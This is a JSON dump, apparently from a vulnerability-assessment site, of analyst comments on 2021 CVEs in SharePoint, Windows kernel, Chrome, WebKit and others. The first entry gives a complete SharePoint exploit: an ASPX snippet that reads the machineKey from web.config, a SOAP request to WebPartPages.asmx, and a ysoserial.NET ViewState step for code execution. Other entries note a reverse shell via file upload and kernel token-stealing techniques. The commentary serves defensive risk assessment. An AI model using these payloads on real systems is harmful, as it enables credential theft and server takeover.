      "document": "The `EditingPageParser.VerifyControlOnSafeList` method fails to properly validate user-supplied data. This can be leveraged by an attacker to leak sensitive information in rendered-preview content. This can be used to leak the ViewState validation key and then use it to sign a crafted object that will trigger code execution when deserialized. In order to leverage this vulnerability, an attacker must have the `SPBasePermissions.ManageLists` permission on the targeted SharePoint site. By default, SharePoint users may create their own site where they will have this permission.\r\n\r\nThe single request required to trigger the vulnerability involves two components, one document escaped and embedded within a SOAP request.\r\n\r\n## Inner Document\r\nIn this document it is required that the Namespace attribute be `\"System.Web.UI.WebControls \"` **with** the trailing space.\r\n```\r\n<%@ Register TagPrefix=\"WebPartPages\" Namespace=\"Microsoft.SharePoint.WebPartPage\" Assembly=\"Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c\" %>\r\n<%@ Register TagPrefix=\"att\" Namespace=\"System.Web.UI.WebControls \" Assembly=\"System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\" %>\r\n<WebPartPages:XsltListFormWebPart id=\"id01\" runat=\"server\" ListDisplayName=\"Documents\" WebId=\"WEB ID\">\r\n  <DataSources>\r\n    <att:xmldatasource runat=\"server\" id=\"XDS1\"\r\n      XPath=\"/configuration/system.web/machineKey\"\r\n      datafile=\"c:/inetpub/wwwroot/wss/VirtualDirectories/80/web.config\" />\r\n  </DataSources>\r\n  <xsl>\r\n      <xsl:stylesheet version=\"2.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\r\n          <xsl:output method=\"xml\" indent=\"yes\" />\r\n          <xsl:template match=\"/\">\r\n              <xsl:copy-of select=\".\" />\r\n          </xsl:template>\r\n      </xsl:stylesheet>\r\n  </xsl>\r\n</WebPartPages:XsltListFormWebPart>\r\n```\r\nThe `WEB ID` needs to be updated to the UUID of the targeted site which is easily obtainable via a GET request to `_api/web/id`.\r\n\r\n## Outer Document\r\nThe inner document is embedded within the `webPartXml` node and the entire body is sent as a SOAP request to the `_vti_bin/WebPartPages.asmx` endpoint as a POST request.\r\n```\r\n<soap12:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap12=\"http://www.w3.org/2003/05/soap-envelope\">\r\n  <soap12:Body>\r\n    <RenderWebPartForEdit xmlns=\"http://microsoft.com/sharepoint/webpartpages\">\r\n      <webPartXml>INNER DOCUMENT</webPartXml>\r\n    </RenderWebPartForEdit>\r\n  </soap12:Body>\r\n</soap12:Envelope>\r\n```\r\n\r\nThe response from this request will contain quite a few things, but embedded a couple of documents deep will ultimately be the validation key used for the server's ViewState.\r\n\r\n## .NET Serialization Gadget Chain\r\nWith the validation key, an attacker can use the [ysoserial.NET](https://github.com/pwntester/ysoserial.net) project to create a payload using the `TypeConfuseDelegate` gadget chain and the `LosFormatter`. Code execution will be obtained within the context of the SharePoint application with the services of the SharePoint service.\r\n\r\n\r\nFor more information, see the [original ZDI](https://www.zerodayinitiative.com/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability) on which this analysis is based.",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "03aee19a-08e6-4547-bdaa-bda644897cb0",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "f43e0e83-ab20-454f-9f52-9a5b06742cb2",
      "created": "2021-06-16T22:40:58.710565Z",
      "revisionDate": "2021-06-16T22:41:40.264538Z",
      "document": "Critical software supply-chain flaw impacting ThroughTek's software development kit (SDK) that could be abused by threat actors to gain improper access to audio and video streams.\r\n\r\nSource: https://us-cert.cisa.gov/ics/advisories/icsa-21-166-01\r\nhttps://thehackernews.com/2021/06/critical-throughtek-flaw-opens-millions.html",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access"
      },
      "tags": []
    },
    {
      "id": "54077839-ea36-46fb-9dca-8fb45aa5f4fc",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "19a3b42a-68bd-48e1-847b-9ba88408ef2b",
      "created": "2021-06-16T22:56:36.189541Z",
      "revisionDate": "2021-06-17T17:22:28.747106Z",
      "document": "Windows MSHTML Platform (Microsoft proprietary browser engine) enables RCE and is being actively exploited in limited campaigns. \r\n\uf0a7\tExploitation requires user interaction; thus, feasible threat scenarios include drive-by download, exploit kits, and phishing links.\r\n\uf0a7\tA commercial exploit company reportedly provided the exploit code to Eastern European and Middle Eastern state-sponsored actors\r\n",
      "score": 3,
      "metadata": {},
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        }
      ]
    },
    {
      "id": "af9a96cd-a99e-4646-b5e4-cabf7f7c366d",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "160d34d9-2175-4b27-87f8-0ced51121f50",
      "created": "2021-06-17T15:06:42.922023Z",
      "revisionDate": "2021-06-17T15:06:42.929336Z",
      "document": "According to https://securelist.com/puzzlemaker-chrome-zero-day-exploit-chain/102771/ this appears to have been used along with CVE-2021-31955 and CVE-2021-31956, a Windows kernel information leak and a Windows LPE vulnerability, to form a full RCE to go from a user browsing a web page to full SYSTEM control over a target Windows device. This is an extremely powerful and valuable exploit chain, and many exploit brokers are willing to pay large sums of money for these chains as they often are very valuable to nation states who wish to use them for their intelligence operations.\r\n\r\nOverall though, on its own it seems like this bug wasn't super valuable as you only get RCE within the sandbox itself, which is why it was then chained with a Windows kernel bug to escape the Chrome sandbox and gain RCE as SYSTEM on the target device. Therefore the risk for this vulnerability alone is lower, however if we keep in mind the other bugs that existed at the time, the overall risk is quite high.\r\n\r\nThere also appears to have been public exploit code available for this vulnerability, available at https://github.com/avboy1337/1195777-chrome0day, which was potentially reused by the attackers. In any case at the time that code was released the bug was still unpatched which lead researchers at Kaspersky to conclude that its likely attackers used the code from https://github.com/avboy1337/1195777-chrome0day in their attack.\r\n\r\nOtherwise this is your typical V8 type confusion bug. V8 seems to have had quite a few type confusion bugs in the past so this is nothing too new. If you want to limit exposure, disable JavaScript in your browser on untrusted sites, which will help prevent users from being exploited by these types of attacks as most of them rely on JavaScript to do set up the environment in Chrome appropriately. That being said disabling JavaScript will break most sites so take this with a grain of salt :)",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "113aa1b7-6df2-4a23-818b-e12cdec691c6",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "cf28d1a4-fc6d-43f8-ac99-3bbdc47734b1",
      "created": "2021-06-17T15:22:37.161696Z",
      "revisionDate": "2021-06-17T15:22:37.171045Z",
      "document": " Exploitation is considered easy. An threat actor can launch the attack from a distance. Only one authentication session is required for operation. The technical details are unknown and an exploit is not available to the public.\r\nhttps://vuldb.com/fr/?id.177125",
      "score": 1,
      "metadata": {
        "exploitability": 5
      },
      "tags": []
    },
    {
      "id": "29045cbf-88d8-439a-acb7-444d843f089a",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "21c170ff-c7c6-4bfb-8aed-613970eda44c",
      "created": "2021-06-17T15:23:59.065336Z",
      "revisionDate": "2021-06-17T15:23:59.071204Z",
      "document": "Ah good old `NtQuerySystemInformation()` strikes again, never quite going out of style :) In this case CVE-2021-31955 is an information disclosure in good old `ntoskrnl.exe`, aka the Windows kernel itself, that occurs due to a Windows feature supported since Windows Vista known as SuperFetch. By sending a `SystemSuperfetchInformation` class request of type `SuperfetchPrivSourceQuery` via the undocumented `NtQuerySystemInformation()` function, one can obtain the kernel address of the `EPROCESS` structure for the current process. This is REALLY bad since the `EPROCESS` kernel structure contains also contains a pointer to the process's permissions token. If we know the address of this token, then, provided one has an arbitrary kernel write vulnerability, they can easily overwrite this pointer to point to the permissions token for a higher privilege process, and if this process is running as SYSTEM, they will gain SYSTEM level code execution.\r\n\r\nAccording to https://securelist.com/puzzlemaker-chrome-zero-day-exploit-chain/102771/, this was used in the wild alongside CVE-2021-31956 to escape the Chrome sandbox and gain SYSTEM on affected users computers, after first compromising Chrome and gaining execution inside the Chrome sandbox with what is suspected to be CVE-2021-21224.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "7cbb1d3f-9f9d-42e0-86f2-526e03854e29",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "03f5ddb7-dfaf-4815-9563-05762a387a0a",
      "created": "2021-06-17T16:04:10.201689Z",
      "revisionDate": "2021-06-17T17:27:56.01651Z",
      "document": "This is a heap buffer overflow in `ntfs.sys`, one of the Windows kernel drivers, which was patched in June 2021. Heap vulnerabilities in the kernel are notoriously unreliable and hard to exploit, particularly given recent mitigations in Windows 8 and then later in Windows 10 that have introduced additional randomness to the kernel heap as well as additional state checks that will result in Windows terminating immediately if data does not look to be valid. Therefore realize that whilst this exploit has been exploited in the wild, I would imagine the reliability may be questionable or there may have been considerable work done behind the scenes to make the exploit more reliable.\r\n\r\nIn any case, the affected function is `NtfsQueryEaUserEaList()` in `ntfs.sys` which processes a list of extended attributes (this is where the `ea` part of the function name comes from) for a file and saves the retrieved values to a buffer. The problem here though is that users can make a Windows system call to access this function and `NtfsQueryEaUserEaList()` and its possible to control the size of the output buffer. However the output buffer's size has to be 32 bit aligned. This causes an issue as whilst the code does check to make sure the output buffer can hold the content of the extended attribute list with padding, it doesn't check for integer underflows, meaning that the check is done as though the number was an unsigned integer, yet when copying memory its treated as a signed integer, which can result in the number underflowing and becoming a large positive number, such that a lot of memory is copied into a very small buffer.\r\n\r\nThis is a particularly interesting case as most of the time when one combines an integer underflow/overflow with a heap buffer vulnerability, things don't tend to pan out so well due to the user corrupting too much memory to reliably control the heap. This can cause issues later on when Windows checks the heap state and suddenly finds everything is trashed, resulting in a BSOD if one corrupts kernel heap memory. For this reason, I'm interested to see how the attackers actually managed to accurately control heap memory in this scenario to exploit the vulnerability.\r\n\r\nFrom the advisory we are given some hints that the Windows Notification Facility (WNF) was used along with this vulnerability to get arbitrary memory read and write primitives, which is a new kernel exploitation strategy I have not heard about before. It appears this was also new to Kaspersky as well as they mention they will be publishing more information about this technique in the future.\r\n\r\nAdditionally, showcasing the sophistication of the attackers who exploited this vulnerability, they also used a rarely used `PreviousMode` overwrite instead of stealing overwriting the `Token` field of the `EPROCESS` structure to steal the token. As mentioned at https://github.com/oct0xor/presentations/blob/master/2019-02-Overview%20of%20the%20latest%20Windows%20OS%20kernel%20exploits%20found%20in%20the%20wild.pdf, this field controls which mode the kernel was in prior to performing a system call. This can allow an attacker to perform sensitive actions by essentially tricking the OS into thinking a system call was made from kernel mode when in reality it was not.",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "b4efa400-374f-4494-80bb-b10078407a32",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "50ec30be-5e8c-4158-8aa0-06397441f8a5",
      "created": "2021-06-17T16:19:45.582195Z",
      "revisionDate": "2021-06-17T16:19:45.585521Z",
      "document": "Not got much to contribute due to limited public information at this time but I did want to note that the `Confidentiality` and `Integrity` scores for this are oddly listed as `Low`, the `Availability` as `None`, and yet `Scope` is marked as `Changed`. My guess is that this is some sort of sandbox related escape given that if we were able to get higher permissions these scores would be a lot higher.",
      "score": 1,
      "metadata": {
        "attacker-value": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "2510738d-f12f-408a-b6e1-72feddd0c316",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "dbaea288-d224-49e1-877d-628dfd1cf161",
      "created": "2021-06-17T16:20:08.35798Z",
      "revisionDate": "2021-06-17T17:27:44.684967Z",
      "document": "Not got much to contribute due to limited public information at this time but I did want to note that the `Confidentiality` and `Integrity` scores for this are oddly listed as `Low`, the `Availability` as `None`, and yet `Scope` is marked as `Changed`. My guess is that this is some sort of sandbox related escape given that if we were able to get higher permissions these scores would be a lot higher.",
      "score": 2,
      "metadata": {
        "attacker-value": 3
      },
      "tags": []
    },
    {
      "id": "3dd0a12e-70e7-42bc-ab49-5afd451cb400",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "86197daf-4ca4-4cd7-b1a5-5f00de015c96",
      "created": "2021-06-17T17:19:15.930386Z",
      "revisionDate": "2021-06-17T17:26:52.117572Z",
      "document": "Public PoC code has been supposively making the rounds courtesy of https://github.com/mavillon1/CVE-2021-33739-POC. There is also a detailed writeup on this issue at https://mp.weixin.qq.com/s/ZjJ4kXOCTSez2erVKYzKbg although it is in Chinese so you will need to translate it.\r\n\r\nFrom the translation it seems this was originally discovered as being exploited in the wild by Shadow Lab in May 2021, and then they worked with Anheng Threat Intelligence Center to notify MSRC, who then patched the bug in the June 2021 patch release. The vulnerability is located in `dwmcore.dll`, which is the core DLL for DWM, aka the Desktop Windows Manager, on Windows machines. More specifically, its a UAF caused by an reference count tracking issue of the Tracker Binding Manager object. Its interesting also to note that they state this vulnerability only affects Windows 10 machines and does not affect Windows 8.1 and below; this is reflected in Microsoft's advisory as well.\r\n\r\nTo trigger the vulnerability, one needs to \"create a CinteractionTrackerBindingManagerMarshaler(0x59) resource and a CinteractionTrackerMarshaler(0x58) resource at the code level, and bind the same CinteractionTrackerMarshaler resource as resource1_id and resource2_id to the CinteractionTrackerBindingManagerMarshaler, and do not manually release the CinteractionTrackerBindingManagerMarshaler resource.\".  I won't discuss it further as the technical details are in the original writeup though but this should provide a brief overview for those interested.\r\n\r\nThe conclusion of this writeup notes that technically this vulnerability falls within the scope of Windows DirectComposition component, which has seen increased attacks over the last two years. It also notes that this may have ties to the release of the `Win32k Dark: Attacking The Shadow Part of Graphic Subsystem` presentation at the Cansecwest 2017 conference, where researchers discussed how to attack Windows DirectComposition in more detail.",
      "score": 2,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "7f619fca-d6d3-4fba-8e8d-b4e2f416e09a",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "19a3b42a-68bd-48e1-847b-9ba88408ef2b",
      "created": "2021-06-17T17:25:10.026796Z",
      "revisionDate": "2021-06-17T17:25:10.031259Z",
      "document": "Based on comments at this thread: https://twitter.com/ShaneHuntley/status/1402320071276433408 we should expect to see a full writeup around July 9th or so from the Google threat assessment team. Seems they will be keeping things close to the vest until then to allow people to patch in the meantime.",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "573e8fde-b180-46c6-8945-6329bd33461d",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "51e88af4-0a81-4b72-8855-34df072124d9",
      "created": "2021-06-21T19:19:16.112196Z",
      "revisionDate": "2021-06-21T19:19:16.115433Z",
      "document": "Apparently this is a UAF vulnerability in the WebGL component of Chrome that has been exploited in the wild according to https://chromereleases.googleblog.com/2021/06/stable-channel-update-for-desktop_17.html. No further details at the moment other than that its triggered via JavaScript, which makes sense given this is a UAF vulnerability. As per usual, disable JavaScript where possible using plugins like NoScript if you want to mitigate the risk of this vulnerability somewhat, however its highly recommended to just update your Chrome and Edge browsers to the latest version available.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "b2f874f6-9f14-408b-8e86-9ec910a4167b",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "d8802b97-577f-4d1b-ba3c-1d6d3ebb2ff2",
      "created": "2021-06-21T19:27:40.167358Z",
      "revisionDate": "2021-06-28T04:38:49.642988Z",
      "document": "From what I can tell this is a UAF vulnerability in WebKit. WebKit vulns are commonly exploited in the wild and this one is no exception with https://support.apple.com/en-us/HT212548 noting that active exploitation in the wild has been discovered. It is a little odd that the patched version is noted as version 12.5.4 of iOS given the latest version is 14.6, but if you are still running on the 12.x branch, make sure to update to 12.5.4 to receive the patches for this vulnerability, particularly given it has a working exploit in the wild. This was likely used alongside the WebKit memory corruption vulnerability (see https://attackerkb.com/topics/DwxtgSIUAV/cve-2021-30761) that was patched in the same release to form a full working exploit against iOS devices.",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "14279e9e-ffe0-4d49-8624-08f82441d84e",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "4324ff7f-3a87-4b49-8d0a-c475f54f194f",
      "created": "2021-06-21T19:29:43.769729Z",
      "revisionDate": "2021-06-21T19:29:43.778316Z",
      "document": "From what I can tell this is a memory corruption vulnerability in WebKit. WebKit vulns are commonly exploited in the wild and this one is no exception with https://support.apple.com/en-us/HT212548 noting that active exploitation in the wild has been discovered. It is a little odd that the patched version is noted as version 12.5.4 of iOS given the latest version is 14.6, but if you are still running on the 12.x branch, make sure to update to 12.5.4 to receive the patches for this vulnerability, particularly given it has a working exploit in the wild. This was likely used alongside the WebKit UAF vulnerability (see https://attackerkb.com/topics/Gyq95f2J1L/cve-2021-30762) that was patched in the same release to form a full working exploit against iOS devices.",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "f023acda-da92-4d93-9c5f-3cf3b05dad15",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "01d089b0-49c7-4911-83c7-e067b19b1391",
      "created": "2021-06-22T16:52:41.150817Z",
      "revisionDate": "2021-06-25T20:02:42.102988Z",
      "document": "This gives the ability to create an administrator account while being unauthenticated. The admin account is rather useless because all other vulnerabilities (unrestricted file upload, information leakage) are unauthenticated too so and admin account is not required.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "906bddf3-8825-4675-b990-dd610c69ec53",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "d03ce7bc-077b-48c8-afb3-2d53e41ea8cd",
      "created": "2021-06-22T16:56:19.993251Z",
      "revisionDate": "2021-06-22T16:56:19.996632Z",
      "document": "The uploaded file must have an image magic byte (eg. GIF) in order to match [getimagesize](https://www.php.net/manual/en/function.getimagesize.php) ([code](https://github.com/Monitorr/Monitorr/blob/efff8fd71eac6369fa187e02d86341f35790af35/assets/php/upload.php#L7)) then you can easily have a reverse shell on the machine.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "f50c7bd0-c8dd-4a41-abc7-68409fc76239",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "ed05d93e-5b20-4b44-bac8-c4cb5b46254a",
      "created": "2021-06-23T23:46:56.462042Z",
      "revisionDate": "2021-06-28T04:38:26.64004Z",
      "document": "In order for a threat actor to successfully exploit this vulnerability they must trick a privileged user (ideally an Exchange administrator) into clicking on a prepared link containing the malicious JavaScript code. This code can send requests to the ECP on behalf of the administrator. As a result, the attacker would gain access to the Exchange server with System privileges via the downloaded web shell.\r\n\r\nSource: https://cyberpolygon.com/materials/okhota-na-ataki-ms-exchange-chast-2-cve-2020-0688-cve-2020-16875-cve-2021-24085/?utm_source=twitter&utm_medium=post&utm_campaign=23/06/21_cp_en&utm_content=read",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "8670d69a-28c5-45ba-bccf-1f64dd227890",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "8b5b4aaa-0168-4a40-a5d1-c502e981e3d6",
      "created": "2021-06-24T12:00:40.065189Z",
      "revisionDate": "2021-06-24T12:00:40.077509Z",
      "document": "The file upload is totally unrestricted but an account is required.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "9e3be368-7928-4e54-b783-63bbb1456c0f",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "199e11a9-43a2-4b08-bb13-e8477269bd74",
      "created": "2021-06-24T18:52:58.653195Z",
      "revisionDate": "2021-06-24T18:52:58.656833Z",
      "document": " Microsoft Edge contains an elevation of privilege vulnerability that could allow actors to escalate privileges.\r\n\r\nSource: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34475",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation"
      },
      "tags": []
    },
    {
      "id": "07839b8f-c930-4244-a429-c5a9f0995fcb",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "b5c7ab6d-dc1f-4cab-beef-b5e3d1372c18",
      "created": "2021-06-24T19:26:23.587387Z",
      "revisionDate": "2021-06-24T19:26:23.595743Z",
